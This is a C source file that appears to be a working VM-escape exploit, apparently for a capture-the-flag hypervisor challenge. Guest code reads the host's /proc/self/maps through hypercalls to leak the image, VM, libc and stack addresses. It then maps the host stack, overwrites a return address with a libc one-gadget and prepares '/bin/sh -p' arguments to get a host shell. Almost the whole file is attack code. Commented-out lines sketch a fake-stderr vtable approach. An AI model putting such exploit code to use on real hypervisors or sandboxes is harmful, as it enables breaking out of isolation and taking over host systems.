#include "hypercall.h"
#include "mm.h"
#include "utils.h"
#include "string.h"


#define HYPER_GOTS 0x204000 
#define HYPER_GOTS_RO 0x203000
#define FREE_OFF 0xF00
#define STDERR_OFF 0x40

#define RUN_RET 0x1743

#define dumpline(fd, buff, size) ({        \
  char *_buff = (buff);                    \
  int _ret = getline((fd), _buff, (size)); \
  if (_ret != -1)                          \
    puts(_buff);                           \
  _ret;                                    \
})


#define d_getline getline

#define VTABLE_WRITE 15

char buff[1000];
const char stack_sect[] = "[stack]";
const char libc_sect[] = "/lib/x86_64-linux-gnu/libc-2.27.so";
const char shell[] = "/bin/sh";
void kernel_main(void) {
  int mapfd = hp_open("/proc/self/maps"); 
  uint64_t image_base, stack_base, stack_end, vm_base, libc_base = 0;

  d_getline(mapfd, buff, sizeof(buff));
  image_base = parseHex(buff);

  d_getline(mapfd, buff, sizeof(buff));
  d_getline(mapfd, buff, sizeof(buff));
  d_getline(mapfd, buff, sizeof(buff));
  d_getline(mapfd, buff, sizeof(buff));
  vm_base = parseHex(buff);

  while (1) {
    int len = d_getline(mapfd, buff, sizeof(buff));
    if (!memcmp(buff + len - strlen(libc_sect), libc_sect, strlen(libc_sect))) {
      char *ptr = buff;
      libc_base = parseHex(ptr);
      break;
    }
  }

  if (libc_base == 0) {
    panic("No libc_base");
  }
  
  while (1) {
    int len = d_getline(mapfd, buff, sizeof(buff));
    if (!memcmp(buff + len - strlen(stack_sect), stack_sect, strlen(stack_sect))) {
      char *ptr = buff;
      stack_base = parseHex(ptr);
      while (*ptr++ != '-') ;
      stack_end = parseHex(ptr);
      break;
    }
  }
  hp_close(mapfd);


  stack_base = stack_end - 0x10000;
  uint64_t stack_size = 0x10000;
  uint64_t *stack = create_hmmap((void*)stack_base, stack_size);

  uint64_t ind = stack_size / 8;
  while (ind --> 0) {
    if (stack[ind] == RUN_RET + image_base) {
      writeHex(stack[ind]);
      break;
    }
  }

  uint64_t* nullptr = kmalloc(8, 0);
  *nullptr = 0;

  uint64_t rbp_ind = (stack[ind-1] - stack_base) / 8;

  // Prepare argv
  stack[ind+9] = physical(shell) + vm_base;
  stack[ind+0xa] = physical("-p") + vm_base;
  stack[ind+0xb] = 0;

  puts("Got shell!");
  stack[ind] = 0x4f322 + libc_base;
  // Unreachable!

  /*
  void *gots_ro = create_hmmap((void*)(imageBase + HYPER_GOTS_RO));
  uint64_t *gots_free = (uint64_t*)(gots_ro + FREE_OFF);

  for (int i = 0; i < 28; i++)
    writeHex(gots_free[i]);

  void *gots = create_hmmap((void*)(imageBase + HYPER_GOTS));
  //FILE *stderr = hderef(*(FILE**)(gots + STDERR_OFF));

  void *fake_stderr = kmalloc(216 + 8, 0);
  memcpy(fake_stderr, stderr, 216);
*/


//#define G_SIGRET 0x3ef20


  //for (int i = 0; i < 20; i++) 
  //  writeHex(vtable[i]);
  
  //vtable[VTABLE_WRITE - 5] = 0;
  //writeHex(vtable[VTABLE_WRITE]);
}


